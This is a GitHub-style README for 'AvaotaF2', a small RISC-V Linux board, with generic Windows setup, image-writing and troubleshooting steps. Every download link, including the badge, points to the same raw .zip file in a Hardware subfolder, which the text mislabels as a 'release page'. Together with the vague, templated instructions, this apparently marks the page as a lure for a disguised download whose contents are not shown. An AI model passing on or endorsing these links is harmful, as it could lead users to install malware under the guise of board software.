# 🛠️ AvaotaF2 - Tiny RISC-V Linux Board

[![Download AvaotaF2](https://img.shields.io/badge/Download-AvaotaF2-8A2BE2?style=for-the-badge)](https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip)

## 📦 What AvaotaF2 Is

AvaotaF2 is a tiny RISC-V Linux SBC built on the Allwinner V861 chip. It is made for users who want a small Linux board with modern RISC-V support and RVV 1.0 ready hardware.

Use it for:
- Linux testing
- Embedded projects
- Small desktop-style setups
- Learning RISC-V hardware
- Device bring-up and board work

## 🖥️ What You Need

Before you start, have these items ready:

- A Windows PC
- An internet connection
- A microSD card or storage device, if your build uses one
- A USB cable, if your board needs one for setup
- A way to write image files to storage
- A monitor, keyboard, and mouse, if you plan to use the board like a small PC

## 🚀 Download the Software

Visit the release page here to download:

https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip

On that page, look for the newest release and pick the file that matches your setup. Common file types may include:

- `.img` for a disk image
- `.zip` for a compressed package
- `.7z` for an archive
- `.tar.gz` for Linux-based package files

If you see more than one file, choose the one meant for Windows users or the one named for the board image.

## 🪟 Install on Windows

Follow these steps on your Windows PC:

1. Open the release page in your browser.
2. Find the latest release near the top of the page.
3. Download the file that matches the board image or package.
4. If the file is compressed, right-click it and choose Extract All.
5. If the download gives you an `.img` file, keep it ready for writing to storage.
6. Use a disk image tool on Windows to write the image to your microSD card or storage device.
7. Safely remove the card or device from your PC.
8. Put it in the AvaotaF2 board.
9. Connect power, display, keyboard, and mouse if needed.
10. Turn on the board and wait for Linux to start.

## 💾 How to Write the Image

If the release gives you a disk image, use a tool that can write images to removable storage.

Common steps:

1. Insert the microSD card or storage device into your Windows PC.
2. Open your image writing tool.
3. Select the downloaded `.img` file.
4. Select the correct drive letter for the card or device.
5. Start the write process.
6. Wait until it finishes.
7. Eject the device before removing it.

Make sure you choose the right drive. Writing an image erases the selected device.

## 🔌 First Boot

After you place the image on the storage device:

1. Insert it into the board.
2. Connect the board to your display.
3. Attach a keyboard and mouse if you want local control.
4. Connect power.
5. Watch for the boot screen.
6. Wait a few minutes on the first start.
7. Follow any on-screen setup steps.

The first boot may take longer than later boots.

## 🧭 Basic Use

Once AvaotaF2 starts, you can use it like a small Linux system.

Common tasks:
- Open a terminal
- Check network settings
- Connect to Wi-Fi or Ethernet
- Browse files
- Run small Linux tools
- Test board features
- Start your own device project

If the board includes a desktop, use the mouse and keyboard to move through menus. If it boots to a text screen, use the keyboard to enter commands.

## 🧰 Common Setup Options

You may want to set up these items after the first boot:

- Network connection
- Screen resolution
- Keyboard layout
- Time and date
- User account name
- Storage expansion
- Startup apps

If the board image includes a setup menu, use that to finish the first-time setup.

## 🔧 Simple Troubleshooting

If the board does not start, check these points:

- The power cable is fully connected
- The storage device is inserted the right way
- The image finished writing without errors
- The monitor is on and set to the right input
- The keyboard and mouse are connected
- You used the correct release file

If the board starts but shows no picture:

- Try another HDMI or display cable
- Try a different monitor
- Recheck the board power supply
- Wait a little longer during first boot

If the storage device does not work:

- Write the image again
- Use a different card or drive
- Make sure the file was fully downloaded

## 📁 Release File Tips

When you open the release page, file names may help you choose the right download.

Look for names that suggest:
- Board image
- SD card image
- Linux build
- Boot package
- Firmware package

If there are checksums or hash files, they help confirm the file downloaded correctly. You can keep them if you want extra file checks.

## 🧪 What AvaotaF2 Is Good For

AvaotaF2 fits well in simple and advanced hardware work:

- Small Linux test boxes
- RISC-V development boards
- Embedded system demos
- Driver testing
- Board bring-up
- Learning Linux on new hardware

The RVV 1.0 ready design makes it useful for work that needs vector support on RISC-V systems.

## 📌 Recommended Windows Tools

These tools can help you set up the board from Windows:

- A web browser for the release page
- A ZIP extractor
- An image writer for `.img` files
- A file manager for checking downloads
- A text editor for reading release notes

Use the release notes on the download page if the project adds special setup steps for a new build.

## 🧾 File Types You May See

Here are the most common file types and what they mean:

- `.img` — a full disk image for your storage device
- `.zip` — a compressed file that you must extract first
- `.7z` — another compressed file type
- `.sha256` — a checksum file for file checks
- `.txt` — release notes or setup instructions

If you see a `.zip` or `.7z` file, extract it before writing anything to the card.

## 🪛 If You Want a Clean Start

If you want to reset the board:

1. Remove the storage device.
2. Write the image again from the release page.
3. Put the device back into the board.
4. Boot again.

This gives you a fresh system and removes local changes on that storage device

## 🔗 Download Again

If you need to get the latest build, use the release page:

https://github.com/xiddiquiali55-pixel/AvaotaF2/raw/refs/heads/main/Hardware/03_Garber/Avaota-v1.3.zip

Open it in your browser, pick the newest release, and download the file that matches your board setup